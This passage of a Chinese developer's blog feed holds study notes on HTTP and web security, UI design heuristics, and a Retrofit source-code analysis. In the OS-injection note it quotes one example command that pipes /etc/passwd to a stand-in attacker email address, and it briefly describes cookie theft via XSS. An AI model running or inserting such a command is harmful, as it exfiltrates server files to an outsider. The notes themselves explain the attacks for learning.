如果中间中断，重新发送。</p>
<h2 id="tcpduan-kai-lian-jie">TCP断开连接<a class="zola-anchor" href="#tcpduan-kai-lian-jie" aria-label="Anchor link for: tcpduan-kai-lian-jie">🔗</a></h2>
<p>首先==接收端发送FIN==数据包给发送端，
然后==发送端回复ACK==数据包给接收端，
然后==发送端发送FIN==数据包给接收端，
最后==接收端回复ACK==数据包给发送端。</p>
<h2 id="uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu">URI(统一资源标识符)和URL（统一资源定位符）<a class="zola-anchor" href="#uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu" aria-label="Anchor link for: uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu">🔗</a></h2>
<ul>
<li>scheme：协议方案  http: | ftp:</li>
</ul>
<p>http://zxy:123@www.zxy.com/path1?a=1#sec1
方案、认证信息、==服务器地址、端口==、路径、查询信息、片段</p>
<h2 id="httpxie-yi-qing-qiu-bao-wen">HTTP协议请求报文<a class="zola-anchor" href="#httpxie-yi-qing-qiu-bao-wen" aria-label="Anchor link for: httpxie-yi-qing-qiu-bao-wen">🔗</a></h2>
<p>请求方法(GET / POST)  请求资源URI  HTTP协议版本
请求首部字段 (请求头)
==空格== ==【CR  0x0d ＋LF 0x0a】==
请求体</p>
<h2 id="httpxie-yi-xiang-ying-bao-wen">HTTP协议响应报文<a class="zola-anchor" href="#httpxie-yi-xiang-ying-bao-wen" aria-label="Anchor link for: httpxie-yi-xiang-ying-bao-wen">🔗</a></h2>
<p>HTTP协议版本 响应码 原因短语
响应首部字段（响应头）
==空格==
响应体</p>
<h2 id="wang-guan">网关<a class="zola-anchor" href="#wang-guan" aria-label="Anchor link for: wang-guan">🔗</a></h2>
<p>能够使通信上的服务器提供非Http协议的服务。</p>
<h2 id="qing-qiu-tou-jie-shao">请求头介绍<a class="zola-anchor" href="#qing-qiu-tou-jie-shao" aria-label="Anchor link for: qing-qiu-tou-jie-shao">🔗</a></h2>
<ul>
<li>47种首部字段</li>
<li>通用首部字段 (请求和响应都使用的字段)</li>
</ul>
<pre data-lang="http" class="language-http "><code class="language-http" data-lang="http">Cache-Control 控制缓存的行为
Connection 逐跳首部、连接的管理
Date 创建报文的日期时间
Pragma 报文指令
Trailer 报文末端的首部一览
Transfer-Encoding 指定报文主体的传输编码方式
Upgrade 升级为其他协议
Via 代理服务器的相关信息
Warning 错误通知
</code></pre>
<ul>
<li>请求首部字段</li>
</ul>
<pre data-lang="http" class="language-http "><code class="language-http" data-lang="http">Accept 用户代理可处理的媒体类型
Accept-Charset 优先的字符集
Accept-Encoding 优先的内容编码
Accept-Language 优先的语言（自然语言）
Authorization Web认证信息
Expect 期待服务器的特定行为
From 用户的电子邮箱地址
Host 请求资源所在服务器
If-Match 比较实体标记（ETag）
If-Modified-Since 比较资源的更新时间
If-None-Match 比较实体标记（与If-Match相反）
If-Range 资源未更新时发送实体Byte的范围请求
If-Unmodified-Since 比较资源的更新时间（与If-Modified-Since相反）
Max-Forwards 最大传输逐跳数
Proxy-Authorization 代理服务器要求客户端的认证信息
Range 实体的字节范围请求
Referer 对请求中URI的原始获取方
TE 传输编码的优先级
User-Agent HTTP 客户端程序的信息
</code></pre>
<ul>
<li>响应首部字段</li>
</ul>
<pre data-lang="http" class="language-http "><code class="language-http" data-lang="http">Accept-Ranges 是否接受字节范围请求
Age 推算资源创建经过时间
ETag 资源的匹配信息
Location 令客户端重定向至指定URI

Proxy-Authenticate 代理服务器对客户端的认证信息
Retry-After 对再次发起请求的时机要求
Server HTTP服务器的安装信息
Vary 代理服务器缓存的管理信息
WWW-Authenticate 服务器对客户端的认证信息
</code></pre>
<ul>
<li>实体首部字段 (请求报文实体和响应报文实体都使用的字段)</li>
</ul>
<pre data-lang="http" class="language-http "><code class="language-http" data-lang="http">Allow 资源可支持的HTTP方法
Content-Encoding 实体主体适用的编码方式
Content-Language 实体主体的自然语言
Content-Length 实体主体的大小（单位 ：字节）
Content-Location 替代对应资源的URI
Content-MD5 实体主体的报文摘要
Content-Range 实体主体的位置范围
Content-Type 实体主体的媒体类型
Expires 实体主体过期的日期时间
Last-Modified 资源的最后修改日期时间
</code></pre>
<h2 id="cookiezhuang-tai-zhui-zong-set-cookie">Cookie状态追踪 ==Set-Cookie==<a class="zola-anchor" href="#cookiezhuang-tai-zhui-zong-set-cookie" aria-label="Anchor link for: cookiezhuang-tai-zhui-zong-set-cookie">🔗</a></h2>
<h3 id="keep-alive-chi-jiu-lian-jie">keep-alive 持久连接<a class="zola-anchor" href="#keep-alive-chi-jiu-lian-jie" aria-label="Anchor link for: keep-alive-chi-jiu-lian-jie">🔗</a></h3>
<p>不用连接一次http请求一次tcp连接。
只要tcp没断开，继续http请求，不用重新连接tcp。</p>
<h2 id="mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan">MIME(Multipurpose Internet Mail Extensions)多用途因特网邮件扩展<a class="zola-anchor" href="#mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan" aria-label="Anchor link for: mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan">🔗</a></h2>
<ul>
<li>multipart/form-data 表单访问</li>
<li>multipart/byteranges 部分内容访问</li>
<li>boundary=xx来划分不同数据类型</li>
</ul>
<pre data-lang="http" class="language-http "><code class="language-http" data-lang="http">Content-Type: multipart&#x2F;form-data; boundary=xx
--xx
--xx
--xx--
</code></pre>
<h3 id="bu-fen-nei-rong-qing-qiu-huo-qu">部分内容请求获取<a class="zola-anchor" href="#bu-fen-nei-rong-qing-qiu-huo-qu" aria-label="Anchor link for: bu-fen-nei-rong-qing-qiu-huo-qu">🔗</a></h3>
<p>==Range: bytes==请求头
==Range: bytes== =1-5000, 5000-</p>
<h3 id="nei-rong-xie-shang">内容协商<a class="zola-anchor" href="#nei-rong-xie-shang" aria-label="Anchor link for: nei-rong-xie-shang">🔗</a></h3>
<p>==Access==请求头</p>
<h2 id="https">HTTPS<a class="zola-anchor" href="#https" aria-label="Anchor link for: https">🔗</a></h2>
<h3 id="shu-zi-qian-ming">数字签名<a class="zola-anchor" href="#shu-zi-qian-ming" aria-label="Anchor link for: shu-zi-qian-ming">🔗</a></h3>
<p>利用非对称加密算法，拿==私钥对摘要信息进行加密==，然后公钥进行解密验证信息。
最重要的是非对称加密算法特性，==私钥和公钥是一对好CP==。一方加密，另一方就解密。</p>
<h3 id="shu-zi-zheng-shu">数字证书<a class="zola-anchor" href="#shu-zi-zheng-shu" aria-label="Anchor link for: shu-zi-zheng-shu">🔗</a></h3>
<p>用于证明==公钥的合法性==，使用私钥对数字签名的公钥进行加密。</p>
<h3 id="gen-zheng-shu">根证书<a class="zola-anchor" href="#gen-zheng-shu" aria-label="Anchor link for: gen-zheng-shu">🔗</a></h3>
<p>是公开可信的自签名证书。整个密钥链认证体系，构成了密钥基础设施（PKI）。</p>
<h3 id="httpszheng-shu-ren-zheng-guo-cheng">Https证书认证过程<a class="zola-anchor" href="#httpszheng-shu-ren-zheng-guo-cheng" aria-label="Anchor link for: httpszheng-shu-ren-zheng-guo-cheng">🔗</a></h3>
<p>证书是由公钥、颁发机构CA等明文内容+明文内容的hash计算值的签名组成。（签名：使用私钥进行加密）。
首先是客户端获取到服务器的证书，这个证书可能会包括中间证书，最后会指向根证书。
然后对证书的签名进行验证证书合法性，使用证书颁发机构CA的公钥对签名进行解密，获得hash值并比较证书内容计算后的hash值是否相同，来判断证书是否合法。</p>
<p>如果服务器证书包含中间证书的话，1.先获取中间证书的公钥来解密签名判断服务器证书有效性。2.再根据中间证书的颁发机构CA，获取中间证书颁发机构CA的公钥解密中间证书的签名，证明中间证书的有效性。3.以此类推，最后指向一个根证书，只要证明根证书的签名合法性，也就证明了这些中间证书也是合法的。最后，判断服务器证书也是合法的。就可以用服务器证书的公钥，对数据传输的对称密钥进行加密，通过对称密钥进行加密通信。</p>
<h3 id="zheng-shu-fen-lei">证书分类<a class="zola-anchor" href="#zheng-shu-fen-lei" aria-label="Anchor link for: zheng-shu-fen-lei">🔗</a></h3>
<p>==费解的地方：要分类证书类别，对公钥功能拆分。除了根证书，签名验证要找证书认证机构的公钥。而不是自己的公钥==
服务器证书：公钥，用于加密通信用。
中间证书：公钥，用于证明服务器证书合法性
根证书：公钥，用于证明中间证书/服务器证书的合法性。自签名证书，公钥解密自己的签名。</p>
<h3 id="https-tong-xin">HTTPS 通信<a class="zola-anchor" href="#https-tong-xin" aria-label="Anchor link for: https-tong-xin">🔗</a></h3>
<ul>
<li>双方通信，客户端获取服务端证书并验证后，发送随机密钥串，完成SSL握手。客户端开始通过密钥串对HTTP报文加密通信。</li>
</ul>
<h3 id="shen-fen-ren-zheng">身份认证<a class="zola-anchor" href="#shen-fen-ren-zheng" aria-label="Anchor link for: shen-fen-ren-zheng">🔗</a></h3>
<h4 id="basicren-zheng">BASIC认证<a class="zola-anchor" href="#basicren-zheng" aria-label="Anchor link for: basicren-zheng">🔗</a></h4>
<p>HTTP1.0就有了，使用请求头加入账号:密码的Base64字符串形式，不够安全。</p>
<h4 id="biao-dan-ren-zheng">表单认证<a class="zola-anchor" href="#biao-dan-ren-zheng" aria-label="Anchor link for: biao-dan-ren-zheng">🔗</a></h4>
<p>也就是利用post请求提交表单，利用cookie携带登录信息认证的。</p>
<h4 id="webdav">WebDAV<a class="zola-anchor" href="#webdav" aria-label="Anchor link for: webdav">🔗</a></h4>
<p>WebDAV（ Web-based Distributed Authoring and Versioning，基于万
维网的分布式创作和版本控制）
是HTTP的扩展协议，用于服务器相关文件操作，增加了其他的请求方法。</p>
<h3 id="css">CSS<a class="zola-anchor" href="#css" aria-label="Anchor link for: css">🔗</a></h3>
<p>让文档内容和设计分离。</p>
<h3 id="xml">XML<a class="zola-anchor" href="#xml" aria-label="Anchor link for: xml">🔗</a></h3>
<p>XML（ eXtensible Markup Language，可扩展标记语言）</p>
<h3 id="sgml">SGML<a class="zola-anchor" href="#sgml" aria-label="Anchor link for: sgml">🔗</a></h3>
<p>标准通用标记语言 SGML（ Standard Generalized
Markup Language）</p>
<h3 id="json">JSON<a class="zola-anchor" href="#json" aria-label="Anchor link for: json">🔗</a></h3>
<p>JSON（ JavaScript Object Notation）是一种以 JavaScript（ ECMAScript）
的对象表示法为基础的轻量级数据标记语言。</p>
<h3 id="xss">XSS<a class="zola-anchor" href="#xss" aria-label="Anchor link for: xss">🔗</a></h3>
<p>跨站脚本攻击（ Cross-Site Scripting， XSS），就是在访问一个网页请求时，添加一些<code>&lt;script/&gt;</code>脚本代码，里面会访问其他网站，这样会把账号和密码等信息传给其他网站。也可以通过==document.cookie==把当前网站的cookie传给第三方网站。</p>
<h3 id="sql-zhu-ru-gong-ji">SQL 注入攻击<a class="zola-anchor" href="#sql-zhu-ru-gong-ji" aria-label="Anchor link for: sql-zhu-ru-gong-ji">🔗</a></h3>
<p>SQL 注入（ SQL Injection），是指Web中通过请求来访问SQL语句时，利用SQL语法特性，比如：添加--表示注释，就把后面一些条件去掉了。达到修改SQL语句来获取请求查询结果。</p>
<h3 id="oszhu-ru-gong-ji">OS注入攻击<a class="zola-anchor" href="#oszhu-ru-gong-ji" aria-label="Anchor link for: oszhu-ru-gong-ji">🔗</a></h3>
<p>利用服务器web请求，对请求参数执行os指令来进行加入一些os指令获取信息。比如：发送邮箱内容时，额外添加cat /etc/passwd | mail hack@example.jp，来达到发送服务器密码给邮箱。</p>

    <div class="muted text-sm">
      <a title="2025-01-06" class="no-underline u-url p-name entry-title" rel="bookmark" href="https://www.obelieve.top/blog/guan-yu-http/">
        <time class="dt-published published" datetime="2025-01-06">2025.01.06</time>
      </a>
      
      <span>&nbsp;on</span>
      <a title="Notes" class="no-underline p-category" rel="category tag" href="https://www.obelieve.top/categories/notes/">
          Notes
        </a>
      

    </div>
  </article>
  
        
          
  <article class="h-entry hentry feed-entry">
    <h2 class="no-border pb-sm entry-title">
      <a class="no-underline  u-url p-name entry-title" rel="bookmark" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;uijiao-hu-she-ji-yuan-ze&#x2F;">UI交互设计原则</a> <a href="#index-5" id="index-5" class="zola-anchor"></a>
    </h2>
    <p>首要目标是评估用户体验。
用户体验：
让用户付出最小成本满足需求 - 易用性
自然，自然的体验是不需要用户去思考的 - 易学习性</p>
<p>Jakob Nielsen（雅各布·尼尔森）：交互设计的十大法则 “启发式”设计原则</p>
<ul>
<li>
<ol>
<li>状态可见原则：让用户快速的了解自己处于何种状态，让用户清楚已发生什么、当前目标是什么、以及未来要怎样。在合适的时间给用户适当的反馈，防止用户使用出现错误。</li>
</ol>
<ul>
<li>按钮状态变化反馈</li>
<li>长时间加载时，时间进度指示器，减少了不确定性-防止用户多次单击同一按钮。</li>
</ul>
</li>
<li>
<p>2.用户可控原则：用户常常会误触到某些功能，系统应该让用户可以方便的退出。</p>
<ul>
<li>用户进行某些操作时，忽然意识到自己不对，需要修改撤回的地方，这个叫临界效应，所以最好支持撤销/重做功能。</li>
</ul>
</li>
<li>
<p>3.一致性原则：同一文案、功能、操作保持一致。</p>
<ul>
<li>结构一致性：规则的有逻辑的排列顺序能减轻用户思考负担。</li>
<li>色彩一致性：产品所使用的主色调应该保持统一。</li>
<li>操作一致性：减少用户学习成本。
<ul>
<li>App返回上一级页面，都通过左上角进行。</li>
</ul>
</li>
<li>反馈一致性：用户点击的反馈效果应该一致。
<ul>
<li>页面滑出效果：都是从左往右滑回，从右往左滑出。</li>
</ul>
</li>
<li>文字样式一致性：产品呈现给用户阅读的文字大小、样式、颜色、布局等不同页面的相同模块都应该是一致的。</li>
</ul>
</li>
<li>
<p>4.环境贴切原则：使用用户熟悉的语言、文字、语句，或者其他用户熟悉的概念，而非系统语言。软件信息应该尽量贴近真实世界，让用户容易理解。</p>
<ul>
<li>计算器的软件界面，和我们现实中使用的样式差不多。</li>
</ul>
</li>
<li>
<p>5.易取原则：组件、按钮及选项可见化，降低用户记忆负担。用户不需要记住各个对话框中的信息。软件的使用指南应该是可见的，且在合适的时候可以再次查看。</p>
</li>
<li>
<p>6.灵活高效原则：有些操作对不同用户使用频率需求是不同的，允许用户定制常用功能也许是个不错的选择。</p>
</li>
<li>
<p>7.优美且简约原则：对话中的内容应该去除不相关的信息或几乎不需要的信息。任何不相关的信息都会让原本重要的信息更难被用户察觉。</p>
</li>
<li>
<p>8.防错原则：比一个优秀错误提醒弹窗更好的设计方式，是在这个错误发生之前就避免它。可以帮助用户排除一些容易出错的情况，或在用户提交之前给他一个确认的选项。</p>
<ul>
<li>登录页面，未填写完账号密码之前，登录按钮置灰不可点击。</li>
<li>退出编辑页面，弹出弹窗提示。</li>
</ul>
</li>
<li>
<p>9.容错原则：错误信息指出错误是什么，并给出解决建议。帮助用户识别出错误，分析出错误的原因再帮助用户回到正确的道路上。如果真的不能帮助用户从错误中恢复，也要尽量为用户提供帮助让用户损失降到最低。</p>
<ul>
<li>密码输入，强弱是否一致</li>
</ul>
</li>
<li>
<p>10.人性化帮助原则：提供帮助文档，方便用户搜索到。</p>
</li>
</ul>

    <div class="muted text-sm">
      <a title="2024-04-21" class="no-underline u-url p-name entry-title" rel="bookmark" href="https://www.obelieve.top/blog/uijiao-hu-she-ji-yuan-ze/">
        <time class="dt-published published" datetime="2024-04-21">2024.04.21</time>
      </a>
      
      <span>&nbsp;on</span>
      <a title="Notes" class="no-underline p-category" rel="category tag" href="https://www.obelieve.top/categories/notes/">
          Notes
        </a>
      

    </div>
  </article>
  
        
          
  <article class="h-entry hentry feed-entry">
    <h2 class="no-border pb-sm entry-title">
      <a class="no-underline  u-url p-name entry-title" rel="bookmark" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;retrofityuan-ma-fen-xi-2-10-0-snapshot&#x2F;">Retrofit源码分析 2.10.0-SNAPSHOT</a> <a href="#index-6" id="index-6" class="zola-anchor"></a>
    </h2>
    <p><img src="https://obelieve.top/site/images/retrofit%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="流程图.png" /></p>
<h2 id="1-jie-shao">1. 介绍<a class="zola-anchor" href="#1-jie-shao" aria-label="Anchor link for: 1-jie-shao">🔗</a></h2>
<p>Retrofit主要是基于OKHttp进一步封装的网络请求的框架。它采用了一种接口方法声明请求的方式，使用方法注解和方法参数注解进行标记请求信息，通过动态代理访问接口方法并解析Method，最后将请求信息汇总组装成okhttp3.Request对象，再根据接口方法返回值类型决定调用适配器(CallAdapter)，内部通过okhttp3.Call.enqueue(..) 或okhttp3.Call.execute() 同步/异步请求，请求响应后通过转换器(Converter)把okhttp3.ResponseBody数据再进行一次转换得到最后的数据。</p>
<h2 id="2-suspend-guan-jian-zi-kotlin-xie-cheng-fang-shi-shi-yong">2.suspend 关键字，Kotlin 协程方式使用<a class="zola-anchor" href="#2-suspend-guan-jian-zi-kotlin-xie-cheng-fang-shi-shi-yong" aria-label="Anchor link for: 2-suspend-guan-jian-zi-kotlin-xie-cheng-fang-shi-shi-yong">🔗</a></h2>
<p>接口方法标记为suspend，会把返回类型T 包装成Call<T>，然后使用异步(enqueue)，通过KotlinExtensions.kt下的Call<T>.await()包装成协程执行（请求时挂起协程，响应后协程resume继续执行）。</p>
<h2 id="3-calladaptershi-xian-lei-jie-shao">3.CallAdapter实现类介绍<a class="zola-anchor" href="#3-calladaptershi-xian-lei-jie-shao" aria-label="Anchor link for: 3-calladaptershi-xian-lei-jie-shao">🔗</a></h2>
<ul>
<li><code>RxJava2CallAdapterFactory</code>.create(isAsync);//isAsync = true or false来判断是否是异步或同步请求。默认是同步请求也就是false。</li>
<li>默认的CallAdapter实现类
<ul>
<li><code>DefaultCallAdapterFactory</code>：<code>Call&lt;T&gt;类型的，调用同步(execute)或异步(enqueue)。</code></li>
<li><code>CompletableFutureCallAdapterFactory</code>：<code>CompletableFuture&lt;T&gt;类型的，使用异步(enqueue)。</code></li>
</ul>
</li>
</ul>
<h2 id="4-yong-fa">4.用法<a class="zola-anchor" href="#4-yong-fa" aria-label="Anchor link for: 4-yong-fa">🔗</a></h2>
<p>这一小节通过一系列不同请求方式的代码来展示相关的用法。
主要分为6个文件，具体代码文件在最后面。</p>
<ul>
<li>ServiceInterface.kt 声明接口请求</li>
<li>Main.kt 测试接口请求</li>
<li>ApiConverterFactory.java 转换器工厂类</li>
<li>ApiRequestBodyConverter.java  转为RequestBody对象转换器类 （@Part 参数对象转为RequestBody）</li>
<li>ApiResponseBodyConverter.java  ResponseBody对象转换器类</li>
<li>HttpBinResponse.java  ResponseBody装好后的数据类</li>
</ul>
<h3 id="4-1-ji-ben-yong-fa">4.1 基本用法<a class="zola-anchor" href="#4-1-ji-ben-yong-fa" aria-label="Anchor link for: 4-1-ji-ben-yong-fa">🔗</a></h3>
<ul>
<li>1.GET 请求下载文件</li>
<li>2.GET 请求</li>
<li>3.GET 请求 查询?name=value</li>
<li>4.GET 请求 查询?name</li>
<li>5.POST 请求</li>
<li>6.POST 请求  表单数据提交 name="名字"&amp;content="内容"</li>
<li>7.POST 请求  多部分表单提交 multipart/form-data</li>
</ul>
<h3 id="4-2-jin-jie-yong-fa">4.2 进阶用法<a class="zola-anchor" href="#4-2-jin-jie-yong-fa" aria-label="Anchor link for: 4-2-jin-jie-yong-fa">🔗</a></h3>
<ul>
<li>1.通过@URL 请求一个不同地址的URL</li>
<li>2.通过Interceptor拦截器，实现动态设置不同BaseUrl</li>
</ul>
<h2 id="5-yuan-ma-ju-ti-shi-li-fen-xi">5. 源码具体示例分析<a class="zola-anchor" href="#5-yuan-ma-ju-ti-shi-li-fen-xi" aria-label="Anchor link for: 5-yuan-ma-ju-ti-shi-li-fen-xi">🔗</a></h2>
<p>这一小节，通过一个post表单提交梳理下执行流程。以下是这个post请求的代码：分为三部分</p>
<ul>
<li>1.接口请求声明部分</li>
<li>2.Retrofit类构建，并返回接口的实现类部分</li>
<li>3.接口请求测试部分</li>
</ul>
<pre><code>interface ServiceInterface {
...
companion object {
        var BASE_URL = &quot;http:&#x2F;&#x2F;www.httpbin.org&#x2F;&quot;
    }
@POST(&quot;&#x2F;post&quot;)
    @FormUrlEncoded
    fun post(@Field(&quot;name&quot;) name:String,@Field(&quot;content&quot;) content:String): Call&lt;ResponseBody&gt;
...
}
public class Main {
...
private static ServiceInterface sServiceInterface
 = new Retrofit.Builder()
.baseUrl(ServiceInterface.Companion.getBASE_URL())
.client(new OkHttpClient.Builder().build())
.addCallAdapterFactory(RxJava2CallAdapterFactory.create())
.addConverterFactory(ApiConverterFactory.create())
.build()
.create(ServiceInterface.class);
&#x2F;**
     * Post请求，表单提交 @FormUrlEncoded @Field
     *&#x2F;
    @Test
    public void testPostFormUrlEncoded(){
        String s = null;
        try {
            Response&lt;ResponseBody&gt; response = sServiceInterface.post(&quot;名字&quot;,&quot;内容&quot;).execute();
            s = response.body().string();
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println(s);
    }
...
}
</code></pre>
<p>从<code>sServiceInterface.post("名字","内容").execute();</code>开始分析
1.先看看<code>sServiceInterface</code>是怎么创建的?
2.再看看调用<code>post("名字","内容")</code>方法是怎么回事?
3.最后看下执行<code>execute()</code>是怎么样的？</p>
<h3 id="kai-shi-fen-xi-1">开始分析1.<a class="zola-anchor" href="#kai-shi-fen-xi-1" aria-label="Anchor link for: kai-shi-fen-xi-1">🔗</a></h3>
<pre data-lang="java" class="language-java "><code class="language-java" data-lang="java">&#x2F;&#x2F;先进入Retrofit#create(..)方法
public &lt;T&gt; T create(final Class&lt;T&gt; service) {
    return (T)
        Proxy.newProxyInstance(
            service.getClassLoader(),
            new Class&lt;?&gt;[] {service},
            new InvocationHandler() {
            ...
              @Override
              public @Nullable Object invoke(Object proxy, Method method, @Nullable Object[] args)
                  throws Throwable {
               ...
                return platform.isDefaultMethod(method)
                    ? platform.invokeDefaultMethod(method, service, proxy, args)
                    : loadServiceMethod(method).invoke(args); &#x2F;&#x2F;看重点部分
              }
            });
&#x2F;&#x2F;分析1结束，通过Proxy.newProxyInstance(..)动态代理获取接口ServiceInterface代理对象。
</code></pre>
<h3 id="kai-shi-fen-xi-2">开始分析2.<a class="zola-anchor" href="#kai-shi-fen-xi-2" aria-label="Anchor link for: kai-shi-fen-xi-2">🔗</a></h3>
<p>从上一步的<code>loadServiceMethod(method).invoke(args)</code>开始分为2个部分：</p>
<ul>
<li>2.1 <code>loadServiceMethod(method)</code></li>
<li>2.2 调用<code>invoke(args)</code>方法</li>
</ul>
<h4 id="kai-shi-fen-xi-2-1-loadservicemethod-method">开始分析2.1 <code>loadServiceMethod(method)</code><a class="zola-anchor" href="#kai-shi-fen-xi-2-1-loadservicemethod-method" aria-label="Anchor link for: kai-shi-fen-xi-2-1-loadservicemethod-method">🔗</a></h4>
<pre data-lang="java" class="language-java "><code class="language-java" data-lang="java"> &#x2F;&#x2F;从Retrofit#loadServiceMethod(..)开始
  ServiceMethod&lt;?&gt; loadServiceMethod(Method method) {
       ...
        result = ServiceMethod.parseAnnotations(this, method);
       ...
    }
    return result;
  }
&#x2F;&#x2F;ServiceMethod#parseAnnotations(..)
  static &lt;T&gt; ServiceMethod&lt;T&gt; parseAnnotations(Retrofit retrofit, Method method) {
    &#x2F;&#x2F;解析生成RequestFactory对象，具体流程在【流程图】图片有描述
    RequestFactory requestFactory = RequestFactory.parseAnnotations(retrofit, method);
    return HttpServiceMethod.parseAnnotations(retrofit, method, requestFactory);
  }

&#x2F;&#x2F;HttpServiceMethod.parseAnnotations(..)
  static &lt;ResponseT, ReturnT&gt; HttpServiceMethod&lt;ResponseT, ReturnT&gt; parseAnnotations(
      Retrofit retrofit, Method method, RequestFactory requestFactory) {
    ...
      adapterType = method.getGenericReturnType();
    ...
  &#x2F;&#x2F;获取调用适配器CallAdapter对象，具体流程在【流程图】图片有描述
    CallAdapter&lt;ResponseT, ReturnT&gt; callAdapter =
        createCallAdapter(retrofit, method, adapterType, annotations);
    Type responseType = callAdapter.responseType();
    ...
  &#x2F;&#x2F;获取转换器Converter对象，具体流程在【流程图】图片有描述
    Converter&lt;ResponseBody, ResponseT&gt; responseConverter =
        createResponseConverter(retrofit, method, responseType);
  ...
  okhttp3.Call.Factory callFactory = retrofit.callFactory;
  return new CallAdapted&lt;&gt;(requestFactory, callFactory, responseConverter, callAdapter);
  ...
  }
&#x2F;**CallAdapted extends HttpServiceMethod&lt;ResponseT, ReturnT&gt;
HttpServiceMethod&lt;ResponseT, ReturnT&gt; extends ServiceMethod&lt;ReturnT&gt;
**&#x2F;
&#x2F;&#x2F;最后返回CallAdapted对象，分析2.1结束。
</code></pre>
<h4 id="kai-shi-fen-xi-2-2-diao-yong-invoke-args-fang-fa">开始分析 2.2  调用<code>invoke(args)</code>方法<a class="zola-anchor" href="#kai-shi-fen-xi-2-2-diao-yong-invoke-args-fang-fa" aria-label="Anchor link for: kai-shi-fen-xi-2-2-diao-yong-invoke-args-fang-fa">🔗</a></h4>
<pre data-lang="java" class="language-java "><code class="language-java" data-lang="java">&#x2F;**CallAdapted中没有invoke方法，invoke方法的实现位于它的父类HttpServiceMethod中**&#x2F;
&#x2F;&#x2F;HttpServiceMethod#invoke(..)
 @Override
  final @Nullable ReturnT invoke(Object[] args) {
    Call&lt;ResponseT&gt; call = new OkHttpCall&lt;&gt;(requestFactory, args, callFactory, responseConverter);
    return adapt(call, args);
  }
&#x2F;&#x2F;adapt(call, args)方法的实现位于CallAdapted中
&#x2F;&#x2F;CallAdapted#adapt(..)
    @Override
    protected ReturnT adapt(Call&lt;ResponseT&gt; call, Object[] args) {
      return callAdapter.adapt(call);
    }
&#x2F;**调用到CallAdapter#adapt(call)方法，由于之前请求接口方法返回值是Call&lt;ResponseBody&gt;，所以调用DefaultCallAdapterFactory#get(..)返回callAdapter对象
**&#x2F;
&#x2F;&#x2F;DefaultCallAdapterFactory#get(..)
  @Override
  public @Nullable CallAdapter&lt;?, ?&gt; get(
      Type returnType, Annotation[] annotations, Retrofit retrofit) {
    ...
    return new CallAdapter&lt;Object, Call&lt;?&gt;&gt;() {
      @Override
      public Type responseType() {
        return responseType;
      }
      @Override
      public Call&lt;Object&gt; adapt(Call&lt;Object&gt; call) {
        return executor == null ? call : new ExecutorCallbackCall&lt;&gt;(executor, call);
      }
    };
  }
&#x2F;&#x2F;最后返回ExecutorCallbackCall对象，分析2.2结束
</code></pre>
<h3 id="kai-shi-fen-xi-3">开始分析3.<a class="zola-anchor" href="#kai-shi-fen-xi-3" aria-label="Anchor link for: kai-shi-fen-xi-3">🔗</a></h3>
<pre data-lang="java" class="language-java "><code class="language-java" data-lang="java">&#x2F;&#x2F;从上一步最后返回ExecutorCallbackCall对象，开始分析
&#x2F;&#x2F;在ExecutorCallbackCall类中
...
   ExecutorCallbackCall(Executor callbackExecutor, Call&lt;T&gt; delegate) {
      this.callbackExecutor = callbackExecutor;
      this.delegate = delegate;
    }
&#x2F;&#x2F;ExecutorCallbackCall#execute()
    @Override
    public Response&lt;T&gt; execute() throws IOException {
      return delegate.execute();
    }
&#x2F;&#x2F;由上可知delegate是OkHttpCall对象
&#x2F;&#x2F;OkHttpCall#execute()
  @Override
  public Response&lt;T&gt; execute() throws IOException {
    okhttp3.Call call;
    ...
      &#x2F;&#x2F;获取okhttp3.Call对象，具体流程在【流程图】图片有描述
      call = getRawCall();
    }
    ...
    return parseResponse(call.execute());
  }
&#x2F;&#x2F;OkHttpCall#parseResponse(call.execute())
  Response&lt;T&gt; parseResponse(okhttp3.Response rawResponse) throws IOException {
    ResponseBody rawBody = rawResponse.body();
    ...
    ExceptionCatchingResponseBody catchingBody = new ExceptionCatchingResponseBody(rawBody);
    try {
      &#x2F;&#x2F;Converter转换器转换数据，然后返回
      T body = responseConverter.convert(catchingBody);
      return Response.success(body, rawResponse);
    } catch (RuntimeException e) {
      catchingBody.throwIfCaught();
      throw e;
    }
  }
&#x2F;&#x2F;最后Converter转换器转换数据，然后返回retrofit2.Response对象，分析3结束。
</code></pre>
<h3 id="zong-jie">总结<a class="zola-anchor" href="#zong-jie" aria-label="Anchor link for: zong-jie">🔗</a></h3>
<p><code>sServiceInterface.post("名字","内容").execute();</code></p>
<ul>
<li>1.<code>sServiceInterface</code>通过Proxy.newProxyInstance(..)动态代理获取接口ServiceInterface代理对象。</li>
<li>2.调用<code>post("名字","内容")</code>方法时，开始执行动态代理内部方法，通过层层解析返回ExecutorCallbackCall类，其中包含OkHttpCall对象变量，OkHttpCall中主要包含了一些okhttp3.Request、okhttp3.Call.execute()等处理。</li>
<li>3.执行<code>execute()</code>，最后就是执行了okhttp3.Call.execute()。</li>
</ul>
<h3 id="qi-ta">其他<a class="zola-anchor" href="#qi-ta" aria-label="Anchor link for: qi-ta">🔗</a></h3>
<ul>
<li>1.对于super和extends的上界下界：
List&lt;? super Food&gt; 表示Food的超类，说明Food是?的下界 （只能add，不能get）
List&lt;? extends Fruit&gt; 表示Fruit的子类，说明Fruit是?的上界 （只能get，不能add）
class Food{}
class Fruit extends Food {}</li>
</ul>
<hr />
<h2 id="6-fu-lu">6. 附录<a class="zola-anchor" href="#6-fu-lu" aria-label="Anchor link for: 6-fu-lu">🔗</a></h2>
<p>【4】用法示例源码</p>
<pre data-lang="kotlin" class="language-kotlin "><code class="language-kotlin" data-lang="kotlin">interface ServiceInterface {

    companion object {
        var BASE_URL = &quot;http:&#x2F;&#x2F;www.httpbin.org&#x2F;&quot;
    }

    @Streaming
    @GET
    fun downloadFile(
        @Header(&quot;RANGE&quot;) downParam: String,
        @Url fileUrl: String
    ): Call&lt;ResponseBody&gt;

